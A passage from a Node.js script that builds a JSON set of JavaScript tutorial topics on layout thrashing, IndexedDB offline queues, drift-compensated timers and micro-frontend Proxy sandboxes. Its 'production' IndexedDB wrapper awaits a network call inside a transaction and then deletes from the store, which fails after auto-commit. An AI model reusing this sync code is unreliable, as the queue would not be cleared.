    id: "js-prod-11",
    topic: "Preventing Layout Thrashing & Forced Synchronous Reflows",
    category: "Performance & Rendering",
    severity: "High / UI Stutter & Frame Drops",
    theProblem: "Layout Thrashing occurs when JavaScript repeatedly interleaves reading geometric layout properties (`offsetWidth`, `clientHeight`, `scrollTop`, `getBoundingClientRect()`) with writing styling properties (`element.style.width = ...`). This forces the browser to prematurely recalculate layout multiple times in a single frame, taking up to 100ms and dropping frame rates to unplayable levels.",
    howItWorksInternally: "Browsers batch DOM style changes and defer layout calculations until the end of the current JavaScript turn. However, if code writes to the DOM (`box.style.width = '100px'`) and immediately reads a geometry property (`box.offsetWidth`), the browser cannot wait: it is FORCED to pause JavaScript execution and execute a full synchronous Reflow across the DOM tree to calculate the new geometry. Repeating this in a loop across 50 elements forces 50 synchronous reflows.",
    productionCode: `// Production FastDOM Batching Engine to Eliminate Layout Thrashing
class FastDomQueue {
  constructor() {
    this._reads = [];
    this._writes = [];
    this._isScheduled = false;
  }

  // Schedule read operation (measuring geometry)
  measure(readFn) {
    this._reads.push(readFn);
    this._scheduleFlush();
  }

  // Schedule write operation (mutating styles/DOM)
  mutate(writeFn) {
    this._writes.push(writeFn);
    this._scheduleFlush();
  }

  _scheduleFlush() {
    if (!this._isScheduled) {
      this._isScheduled = true;
      requestAnimationFrame(() => this._flush());
    }
  }

  // Flushes: ALL reads run first, then ALL writes run together! Zero thrashing!
  _flush() {
    const reads = this._reads;
    const writes = this._writes;
    this._reads = [];
    this._writes = [];
    this._isScheduled = false;

    // Phase 1: Batch all reads together
    for (const read of reads) {
      try { read(); } catch (e) { console.error(e); }
    }

    // Phase 2: Batch all writes together
    for (const write of writes) {
      try { write(); } catch (e) { console.error(e); }
    }
  }
}

// Production Usage:
const fastDom = new FastDomQueue();
const cards = document.querySelectorAll(".card");

// Synchronously alternating would thrash. FastDom batches reads and writes cleanly:
cards.forEach(card => {
  fastDom.measure(() => {
    const width = card.offsetWidth; // Read phase
    fastDom.mutate(() => {
      card.style.height = (width * 0.75) + "px"; // Write phase
    });
  });
});`,
    monitoringMetrics: [
      "Chrome DevTools: 'Forced reflow is a likely performance bottleneck' warnings [Severity: High]",
      "Layout recalculation duration per frame > 10ms [Severity: High]",
      "Rendering pipeline style recalculation count per frame > 2 [Severity: Medium]"
    ],
    productionChecklist: [
      "Never alternate reading and writing DOM geometry in a loop (`read -> write -> read -> write`).",
      "Batch all geometric reads (`offsetWidth`, `getBoundingClientRect()`) together before executing style writes.",
      "Use `transform` and `opacity` CSS properties for animations, as they are handled by the compositor without triggering Reflow or Repaint.",
      "Cache calculated dimensions in JavaScript variables rather than re-querying the DOM.",
      "Profile animations in the Chrome DevTools Rendering tab with 'Paint flashing' and 'Layout Shift Regions' enabled."
    ]
  },
  {
    id: "js-prod-12",
    topic: "Offline-First State Synchronization with IndexedDB & Transaction Isolation",
    category: "Data Layer & Storage",
    severity: "Critical / Data Loss on Network Drop",
    theProblem: "Modern web applications (e.g. note-taking, CRM, field operations) must operate reliably during intermittent network drops or offline flight modes. Relying on `localStorage` is dangerous because it is synchronous, blocking the main thread during reads/writes, and is strictly capped at a tiny 5MB limit. Storing complex offline state requires `IndexedDB`, but raw IndexedDB code is notoriously error-prone with unhandled transaction aborts and database version upgrade crashes.",
    howItWorksInternally: "IndexedDB is a transactional, asynchronous, indexed NoSQL object store running in the browser. It stores gigabytes of structured data, blobs, and typed arrays. Every operation occurs within a transaction (`readonly` or `readwrite`). A transaction automatically commits when all scheduled requests finish and control returns to the event loop. If an unhandled exception occurs inside a transaction callback, IndexedDB rolls back all mutations atomically to preserve data integrity.",
    productionCode: `// Production IndexedDB Wrapper with Atomic Transactions and Offline Sync Queue
class OfflineStore {
  constructor(dbName = "AppOfflineDb", version = 1) {
    this.dbName = dbName;
    this.version = version;
    this.db = null;
  }

  async init() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.version);

      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        // Create object store with auto-incrementing key
        if (!db.objectStoreNames.contains("sync_queue")) {
          db.createObjectStore("sync_queue", { keyPath: "id", autoIncrement: true });
        }
      };

      request.onsuccess = () => {
        this.db = request.result;
        resolve(this);
      };

      request.onerror = () => reject(request.error);
    });
  }

  // Queue mutation action atomically while offline
  async enqueueAction(actionType, payload) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction(["sync_queue"], "readwrite");
      const store = tx.objectStore("sync_queue");

      const item = {
        actionType,
        payload,
        createdAt: Date.now()
      };

      const request = store.add(item);
      tx.oncomplete = () => resolve(request.result);
      tx.onerror = () => reject(tx.error);
      tx.onabort = () => reject(new Error("IndexedDB transaction aborted"));
    });
  }

  // Drain and sync queue when network reconnects
  async drainSyncQueue(syncApi) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction(["sync_queue"], "readwrite");
      const store = tx.objectStore("sync_queue");
      const request = store.getAll();

      request.onsuccess = async () => {
        const items = request.result;
        for (const item of items) {
          try {
            await syncApi(item.actionType, item.payload);
            // Delete synced item
            store.delete(item.id);
          } catch (err) {
            console.error("Failed to sync item, stopping drain:", err);
            break;
          }
        }
        resolve(items.length);
      };
      tx.onerror = () => reject(tx.error);
    });
  }
}`,
    monitoringMetrics: [
      "IndexedDB transaction abort rate > 0.05% [Severity: Critical]",
      "Pending offline sync queue items count > 200 items [Severity: High]",
      "IndexedDB storage quota utilization > 80% [Severity: Medium]"
    ],
    productionChecklist: [
      "Never use `localStorage` for large datasets or offline queues; it is synchronous and blocks the UI thread.",
      "Always handle `onblocked` and `onupgradeneeded` events when upgrading IndexedDB schema versions.",
      "Wrap IndexedDB operations in transactions to guarantee atomic rollback on network or code errors.",
      "Listen to `window.addEventListener('online')` to automatically trigger sync queue draining.",
      "Check `navigator.storage.estimate()` to inspect available browser quota before saving large media blobs."
    ]
  },
  {
    id: "js-prod-13",
    topic: "Drift-Compensated Accurate Timing Engine",
    category: "Timing & Precision",
    severity: "High / Timer Cumulative Drift & Scheduling Errors",
    theProblem: "Standard JavaScript timers (`setInterval`, `setTimeout`) are notoriously inaccurate. If you set `setInterval(fn, 1000)`, the callback does NOT fire at exact 1000ms intervals. Because JavaScript is single-threaded, if another task is executing on the call stack, the timer is delayed. Over 10 minutes, a standard interval drifts by several seconds, desynchronizing trading counters, financial audio/video players, and countdown timers.",
    howItWorksInternally: "In the browser, timers are placed in the Macrotask Queue. A timer can only execute when the call stack is empty and all pending microtasks have drained. If another operation takes 15ms, your 1000ms timer fires at 1015ms. In standard `setInterval`, this 15ms error is permanently compounded on every tick. An accurate timing engine uses recursive `setTimeout` with continuous clock drift compensation against `performance.now()`.",
    productionCode: `// Production Drift-Compensated High-Precision Ticker
class PrecisionTicker {
  constructor(intervalMs, callback) {
    this.intervalMs = intervalMs;
    this.callback = callback;
    this.expectedTime = 0;
    this.timerId = null;
    this.running = false;
  }

  start() {
    this.running = true;
    this.expectedTime = performance.now() + this.intervalMs;
    this._scheduleNext();
  }

  _scheduleNext() {
    if (!this.running) return;

    // Calculate drift: how far has real time moved past expected time?
    const drift = performance.now() - this.expectedTime;
    
    // Compensate next interval by subtracting accumulated drift!
    const nextDelay = Math.max(0, this.intervalMs - drift);

    this.timerId = setTimeout(() => {
      if (!this.running) return;

      this.callback();

      // Advance expected time forward by exact target interval
      this.expectedTime += this.intervalMs;

      // Handle severe drift (e.g. laptop lid closed or background tab clamped)
      if (performance.now() - this.expectedTime > this.intervalMs * 2) {
        console.warn("[Timer Alert] Severe clock drift detected. Re-synchronizing baseline.");
        this.expectedTime = performance.now() + this.intervalMs;
      }

      this._scheduleNext();
    }, nextDelay);
  }

  stop() {
    this.running = false;
    if (this.timerId) clearTimeout(this.timerId);
  }
}

// Test with 1000ms precision ticker:
// const ticker = new PrecisionTicker(1000, () => {
//   console.log("Tick at exact interval:", performance.now());
// });
// ticker.start();`,
    monitoringMetrics: [
      "Timer drift deviation from target interval > 50ms [Severity: High]",
      "Background tab timer throttling clamping detection [Severity: Medium]",
      "Missed tick count in audio/video synchronization > 1 [Severity: High]"
    ],
    productionChecklist: [
      "Never use bare `setInterval` for financial countdowns, audio schedulers, or game loops.",
      "Calculate drift compensation using `performance.now()` high-resolution monotonic timestamps.",
      "Account for browser background tab throttling (browsers clamp background timers to 1000ms).",
      "Provide resynchronization logic if the system sleeps or laptop lid is closed.",
      "Always call `clearTimeout` when stopping tickers to prevent orphaned background timers."
    ]
  },
  {
    id: "js-prod-14",
    topic: "Module Federation & Micro-Frontend Global State Isolation",
    category: "Architecture & Scalability",
    severity: "High / Cross-Team State Collision & Style Leakage",
    theProblem: "In large enterprise architectures with Micro-Frontends (using Webpack Module Federation or independent script tags), different teams deploy independent frontends that run in the same browser window. If Team A and Team B both mutate `window.state`, register identical global event names, or use incompatible versions of shared libraries, the application suffers catastrophic state collisions, broken styling, and hard-to-reproduce cross-team bugs.",
    howItWorksInternally: "Because standard browser JavaScript shares a single global `window` object and a single DOM document, micro-frontends must enforce strict sandboxing. Modern micro-frontend hosts use JavaScript `Proxy` to construct sandboxed Window environments for each micro-app: reads and writes to global variables are intercepted and redirected to a localized virtual store without polluting the real global `window`.",
    productionCode: `// Production Sandbox Window Proxy for Micro-Frontends
class MicroAppSandbox {
  constructor(appName) {
    this.appName = appName;
    this.fakeWindow = {};
    this.active = false;

    // Create Proxy sandboxing access to the global window
    this.proxy = new Proxy(window, {
      get: (target, prop) => {
        // Return local fakeWindow property if assigned by micro-app
        if (prop in this.fakeWindow) {
          return this.fakeWindow[prop];
        }
        // Fall back to native window property, binding functions to real window
        const value = target[prop];
        return typeof value === "function" ? value.bind(target) : value;
      },

      set: (target, prop, value) => {
        if (this.active) {
          // Trap global assignments inside local fakeWindow!
          this.fakeWindow[prop] = value;
          return true;
        }
        return false;
      }
    });
  }

  mount() {
    this.active = true;
  }

  unmount() {
    this.active = false;
    this.fakeWindow = {}; // Clear sandbox state on unmount!
  }
}

// Production Usage:
const teamApp = new MicroAppSandbox("CheckoutTeamApp");
teamApp.mount();

// Code running inside micro-app:
teamApp.proxy.cartTotal = 99.95; // Writes to sandbox, NOT global window!

console.log("Sandbox value:", teamApp.proxy.cartTotal); // 99.95
console.log("Global window unpolluted:", window.cartTotal); // undefined (Protected!)`,
    monitoringMetrics: [
      "Global window variables count created at runtime > 10 [Severity: High]",
      "Cross-micro-frontend style collision detections [Severity: High]",
      "Duplicate library version loads in network tab > 1 [Severity: Medium]"
    ],
    productionChecklist: [
      "Isolate micro-frontend global state using Proxy sandboxes or Web Workers.",
      "Isolate CSS styles using Shadow DOM (`attachShadow({ mode: 'open' })`) or CSS Module scoping.",
      "Ensure shared singleton dependencies (like React and React-DOM) are federated cleanly using Module Federation shared configuration.",
      "Prefix custom events (`teamA:orderCreated`) to prevent naming collisions across teams.",
      "Unmount and clear local state when switching micro-frontend routes."
    ]
  }
];

const targetPath = path.join(__dirname, "../data/javascript.production.json");
fs.writeFileSync(targetPath, JSON.stringify(productionTopics, null, 2), "utf-8");
console.log(`Successfully generated ${productionTopics.length} Production Mastery topics to ${targetPath}`);
